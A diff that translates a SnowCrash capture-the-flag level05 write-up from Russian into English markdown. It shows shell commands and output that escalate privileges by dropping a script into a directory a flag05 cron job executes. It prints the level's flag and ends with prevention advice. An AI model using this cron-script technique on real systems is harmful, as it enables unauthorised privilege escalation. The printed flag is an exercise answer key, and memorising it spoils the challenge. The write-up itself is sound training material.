@@ -1,159 +1,182 @@
-Level05
-==========================
+# Level05
 
-Flag
-----
+## Flag
 
 viuaaale9huek52boumoomioc
 
-* * *
+---
 
-Discovery
----------
+## Discovery
 
-### Пробуем getflag
+### Trying getflag
 
-    level05@SnowCrash:~$ getflag
-    Check flag.Here is your token :
-    Nope there is no token here for you sorry. Try again :)
+```
+level05@SnowCrash:~$ getflag
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+```
 
-Ожидаемо — без прав пользователя **flag05** мы токен не получим.
+Expected — without **flag05** privileges we cannot get the token.
 
-### Проверяем содержимое домашней директории
+### Checking the home directory contents
 
-    level05@SnowCrash:~$ ls
-    level05@SnowCrash:~$
+```
+level05@SnowCrash:~$ ls
+level05@SnowCrash:~$
+```
 
-Папка пустая — никаких бинарников, скриптов или подсказок.
+The folder is empty — no binaries, scripts, or hints.
 
-### Ищем файлы, принадлежащие level05
+### Searching for files owned by level05
 
-Результат — ничего полезного (всё в /proc). Поэтому сразу ищем файлы хозяина уровня: **flag05**.
+Result — nothing useful (everything is inside /proc).
+So we immediately search for files owned by **flag05**.
 
-### Поиск файлов пользователя flag05
+### Searching for files owned by flag05
 
-    level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
-    /usr/sbin/openarenaserver
-    /rofs/usr/sbin/openarenaserver
+```
+level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+```
 
-Проверяем содержимое файла:
+Checking the file contents:
 
-    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
-    #!/bin/sh
+```
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
 
-    for i in /opt/openarenaserver/\* ; do
-            (ulimit -t 5; bash -x "$i")
-            rm -f "$i"
-    done
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+```
 
-Сразу несколько наблюдений:
+A few immediate observations:
 
-*   Скрипт запускает все файлы в `/opt/openarenaserver/*`.
-*   Запускает их через bash — значит мы можем вставить туда любой код.
-*   После выполнения файл удаляется.
+* The script runs all files from `/opt/openarenaserver/*`.
+* It runs them using bash — meaning we can put any code there.
+* After execution, the file is deleted.
 
-Значит, если мы сможем заставить этот скрипт выполниться под пользователем **flag05**, то получим нужные привилегии.
+Therefore, if we can make this script run under **flag05**, we will obtain the required privileges.
 
-* * *
+---
 
-Use (Exploit)
--------------
+## Use (Exploit)
 
-### Пробуем создать скрипт в /opt/openarenaserver
+### Trying to create a script in /opt/openarenaserver
 
-    level05@SnowCrash:~$ touch /opt/openarenasererver/script.sh
-    level05@SnowCrash:~$ vim /opt/openarenasererver/script.sh
+```
+level05@SnowCrash:~$ touch /opt/openarenasererver/script.sh
+level05@SnowCrash:~$ vim /opt/openarenasererver/script.sh
 
-    #!/bin/bash
-    getflag
+#!/bin/bash
+getflag
+```
 
-Пробуем выполнить:
+Trying to execute it:
 
-    level05@SnowCrash:~$ /opt/openarenasererver/script.sh
-    bash: /opt/openarenasererver/script.sh: Permission denied
+```
+level05@SnowCrash:~$ /opt/openarenasererver/script.sh
+bash: /opt/openarenasererver/script.sh: Permission denied
+```
 
-Добавляем права:
+Add permissions:
 
-    level05@SnowCrash:~$ chmod +x /opt/openarenasererver/script.sh
-    level05@SnowCrash:~$ /opt/openarenasererver/script.sh
-    Check flag.Here is your token :
-    Nope there is no token here for you sorry. Try again :)
+```
+level05@SnowCrash:~$ chmod +x /opt/openarenasererver/script.sh
+level05@SnowCrash:~$ /opt/openarenasererver/script.sh
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+```
 
-Так и должно быть — скрипт исполняется **от имени level05**, а не flag05.
+That is correct — the script is executed **as level05**, not as flag05.
 
-### Пробуем запустить openarenaserver напрямую
+### Trying to run openarenaserver directly
 
-    level05@SnowCrash:~$ /usr/sbin/openarenaserver
-    bash: /usr/sbin/openarenaserver: Permission denied
+```
+level05@SnowCrash:~$ /usr/sbin/openarenaserver
+bash: /usr/sbin/openarenaserver: Permission denied
+```
 
-Логично — файл принадлежит flag05.
+Logical — the file belongs to flag05.
 
-### Ищем, где этот скрипт может автоматически запускаться
+### Searching where this script may be executed automatically
 
-Ищем упоминания:
+Searching for references:
 
-    level05@SnowCrash:/$ grep -rnw '/var' -e 'openarenaserver' 2>/dev/null
-    /var/mail/level05:1:\*/2 \* \* \* \* su -c "sh /usr/sbin/openarenaserver" - flag05
-    /var/spool/mail/level05:1:\*/2 \* \* \* \* su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+level05@SnowCrash:/$ grep -rnw '/var' -e 'openarenaserver' 2>/dev/null
+/var/mail/level05:1:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+/var/spool/mail/level05:1:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
 
-Это выглядит как cron‑задание. Проверяем файл:
+This looks like a cron job. Checking the file:
 
-    level05@SnowCrash:/$ cat /var/mail/level05
-    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+level05@SnowCrash:/$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
 
-*   */2 * * * * → выполняется каждые 2 минуты
-*   su -c "..." - flag05 → запускает команду от имени flag05
-*   sh /usr/sbin/openarenaserver → запускается именно **наш скрипт**
+* */2 * * * * → runs every 2 minutes
+* `su -c "..." - flag05` → executes the command as flag05
+* `sh /usr/sbin/openarenaserver` → runs exactly **our script**
 
-То есть любой файл, который мы положим в `/opt/openarenaserver`, через максимум 2 минуты будет выполнен **от имени flag05**.
+So any file we place inside `/opt/openarenaserver` will be executed within at most 2 minutes **as flag05**.
 
-### Проверяем, запущен ли cron
+### Checking if cron is running
 
-    level05@SnowCrash:/$ ps -ef | grep cron
-    root      1502     1  0 16:00 ?        00:00:00 cron
+```
+level05@SnowCrash:/$ ps -ef | grep cron
+root      1502     1  0 16:00 ?        00:00:00 cron
+```
 
-Cron работает — отлично.
+Cron is running — perfect.
 
-### Создаём полезный скрипт
+### Creating a useful script
 
-Так как мы не знаем, куда у нас есть права записи, пробуем сохранить флаг в /tmp:
+Since we don't know where we have write permissions, let's save the flag to /tmp:
 
-    level05@SnowCrash:/$ vim /opt/openarenaserver/script.sh
+```
+level05@SnowCrash:/$ vim /opt/openarenaserver/script.sh
+```
 
-Содержимое:
+Contents:
 
-    #!/bin/bash
+```
+#!/bin/bash
 
-    touch /tmp/getflag
-    getflag > /tmp/getflag
+touch /tmp/getflag
+getflag > /tmp/getflag
+```
 
-Через 2 минуты проверяем:
+After 2 minutes, check:
 
-    level05@SnowCrash:/$ cat tmp/getflag
-    Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
+level05@SnowCrash:/$ cat tmp/getflag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
 
-Готово — мы получили флаг пользователя flag05.
+Done — we got the flag for user flag05.
 
-* * *
+---
 
-Prevention
-----------
+## Prevention
 
-Чтобы избежать подобной уязвимости, требуется:
+To avoid such a vulnerability, one must:
 
-*   **Никогда не исполнять файлы из директории, куда может писать другой пользователь**.
-*   Использовать строгие разрешения: `chmod 700 /opt/openarenaserver`.
-*   Проверять владельца каждого файла перед выполнением.
-*   Отказаться от скриптов, запускаемых cron от имени привилегированного пользователя.
-*   Избежать конструкции вида `bash -x "$i"` — она напрямую исполняет пользовательский код.
+* **Never execute files from a directory writable by another user**.
+* Use strict permissions: `chmod 700 /opt/openarenaserver`.
+* Verify the owner of each file before executing it.
+* Avoid cron jobs running scripts as privileged users.
+* Avoid constructs like `bash -x "$i"` — it directly executes user‑controlled code.
 
-* * *
+---
 
-Documentation
--------------
+## Documentation
 
-*   man cron
-*   man crontab
-*   man su
-*   man bash
-*   man find
+* man cron
+* man crontab
+* man su
+* man bash
+* man find
